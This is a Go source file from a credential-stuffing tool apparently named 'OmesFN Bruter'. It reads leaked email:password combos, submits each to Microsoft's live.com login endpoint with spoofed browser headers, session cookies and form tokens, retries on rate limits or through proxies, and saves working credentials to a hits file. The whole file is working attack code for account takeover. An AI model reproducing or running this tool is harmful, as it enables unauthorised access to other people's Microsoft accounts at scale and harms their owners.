package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	bruterResultsFolder string
	bruterInitOnce      sync.Once
	initialComboCount   int
)

func getBruterResultsFolder() string {
	bruterInitOnce.Do(func() {
		timestamp := time.Now().Format("20060102_150405")
		bruterResultsFolder = filepath.Join("Results", fmt.Sprintf("bruter_%s", timestamp))
		os.MkdirAll(bruterResultsFolder, os.ModePerm)
	})
	return bruterResultsFolder
}

func BruterCheck(acc string) bool {
	credentials := strings.Split(acc, ":")
	if len(credentials) < 2 {
		LogError(fmt.Sprintf("[-] Invalid %s", acc))
		exportBads(acc)
		return false
	}
	email, password := credentials[0], credentials[1]

	client := &http.Client{}

	for {
		authURL := "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"

		payload := url.Values{}
		payload.Set("i13", "0")
		payload.Set("login", email)
		payload.Set("loginfmt", email)
		payload.Set("type", "11")
		payload.Set("LoginOptions", "3")
		payload.Set("lrt", "")
		payload.Set("lrtPartition", "")
		payload.Set("hisRegion", "")
		payload.Set("hisScaleUnit", "")
		payload.Set("passwd", password)
		payload.Set("ps", "2")
		payload.Set("psRNGCDefaultType", "1")
		payload.Set("psRNGCEntropy", "")
		payload.Set("psRNGCSLK", PsRNGCSLK)
		payload.Set("canary", "")
		payload.Set("ctx", "")
		payload.Set("hpgrequestid", "")
		payload.Set("PPFT", Ppft)
		payload.Set("PPSX", "Passp")
		payload.Set("NewUser", "1")
		payload.Set("FoundMSAs", "")
		payload.Set("fspost", "0")
		payload.Set("i21", "0")
		payload.Set("CookieDisclosure", "0")
		payload.Set("IsFidoSupported", "1")
		payload.Set("isSignupPost", "0")
		payload.Set("isRecoveryAttemptPost", "0")
		payload.Set("i19", "21648")

		req, _ := http.NewRequest("POST", authURL, strings.NewReader(payload.Encode()))

		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Cookie", Cookie)

		resp, err := client.Do(req)
		if err != nil {
			exportRetries(acc, err.Error())
			return false
		}
		defer resp.Body.Close()

		AddToCpm(1)

		body, _ := ioutil.ReadAll(resp.Body)
		bodyStr := string(body)

		for _, keyword := range FailureKeywords {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(keyword)) {
				exportBads(acc)
				return false
			}
		}

		if strings.Contains(bodyStr, "cancel?mkt=") || strings.Contains(bodyStr, "passkey?mkt=") {
			formURL := Parse(bodyStr, `action="`, `"`)
			if formURL != "" {
				ruURLStr := Parse(formURL, "ru=", "&")
				if ruURLStr == "" {
					ruURLStr = Parse(formURL, "ru=", "")
				}
				if ruURLStr != "" {
					decodedRuURL, _ := url.QueryUnescape(ruURLStr)
					finalURL := fmt.Sprintf("%s&res=success", decodedRuURL)
					_, err := client.Get(finalURL)
					if err != nil {
					}
				}
			}
		}

		if resp.StatusCode == 429 || strings.Contains(bodyStr, "retry with a different device") {
			if !UseProxies {
				time.Sleep(2 * time.Second)
				continue
			} else {
				exportRetries(acc, "proxy rate limited")
				return false
			}
		}

		exportHits(acc)
		break
	}
	return true
}

func exportBads(acc string) {
	folder := getBruterResultsFolder()
	f, _ := os.OpenFile(filepath.Join(folder, "bads.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		f.WriteString(acc + "\n")
	}
	AddToBad(1)
	AddToCheck(1)
}

func exportRetries(acc, reason string) {
	f, _ := os.OpenFile("error_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s - %s\n", acc, reason))
	}
	AddToRetries(1)
	Combos <- acc
}

func exportHits(acc string) {
	folder := getBruterResultsFolder()
	f, _ := os.OpenFile(filepath.Join(folder, "hits.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		f.WriteString(acc + "\n")
	}
	LogSuccess(fmt.Sprintf("\n[+] Hit - %s", acc))
	AddToHits(1)
	AddToCheck(1)
}

func UpdateBruterTitle(wg *sync.WaitGroup) {
	defer wg.Done()

	if initialComboCount == 0 {
		initialComboCount = len(Ccombos)
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for CheckerRunning {
		<-ticker.C
		elapsed := time.Since(Sw)
		minutes := int(elapsed.Minutes())
		seconds := int(elapsed.Seconds()) % 60

		cpm := Cpm * 60

		title := fmt.Sprintf("OmesFN Bruter | Checked: %d/%d | Hits: %d | Fails: %d | CPM: %d | Retries: %d | Time: %dm %ds",
			Check, initialComboCount, Hits, Bad, cpm, Retries, minutes, seconds)

		setConsoleTitle(title)
	}
}
